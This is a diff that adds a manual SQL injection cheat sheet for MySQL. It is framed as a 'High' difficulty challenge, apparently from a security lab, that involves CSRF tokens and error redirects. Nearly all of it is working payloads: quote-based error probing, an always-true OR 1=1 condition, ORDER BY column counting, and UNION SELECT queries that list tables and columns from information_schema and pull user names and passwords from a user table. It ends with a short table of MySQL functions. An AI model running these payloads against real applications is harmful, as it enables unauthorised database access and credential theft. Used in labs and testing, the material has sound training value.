@@ -1,0 +1,45 @@
+High Manual SQL Injection Payload Example - mysql
+@ challenge : construct string (sql payload) without error using post method + error handling redirect to 500 page + csrf token + randomize PHPSESSID.
+@ challenge : find some hidden tables and data on the database.
+
+-- Tests for SQL injection by injecting a single quote to provoke error messages. Will redirect to 500 page
+1' 
+
+-- Attempts a boolean-based SQL injection by injecting a condition that always evaluates to true, listing all user.
+1' OR 1=1#
+
+-- Will produce error at 4, meaning query targets three columns
+1' order by 1 # -- Order by the first column
+1' order by 2 # -- Order by the second column
+1' order by 3 # -- Order by the third column
+1' order by 4 # -- Error indicates the query targets at least three columns
+
+OR
+
+1' order by 1,2,3# -- Order by the 1,2,3 column. No error
+1' order by 1,2,3,4# -- Error indicates the query targets at least three columns
+
+-- Tries a union-based SQL injection to extract database and column names.
+
+-- Retrieve current database and its version
+1' UNION SELECT database(), version(), current_user()#
+
+-- Retrieve table names from the specified database
+1' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema='lekir'#
+
+-- Retrieve column names from the specified table
+1' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='user' AND table_schema='lekir'#
+
+-- Retrieve user-related information from the user table
+1' UNION SELECT user_id, user_name, user_password FROM user#
+
+
+-- Notes
+MySQL Functions
+
+CURRENT_USER()	Returns the user name and host name for the MySQL account that the server used to authenticate the current client
+DATABASE()		Returns the name of the current database
+SESSION_USER()	Returns the current MySQL user name and host name
+SYSTEM_USER()	Returns the current MySQL user name and host name
+USER()			Returns the current MySQL user name and host name
+VERSION()		Returns the current version of the MySQL database
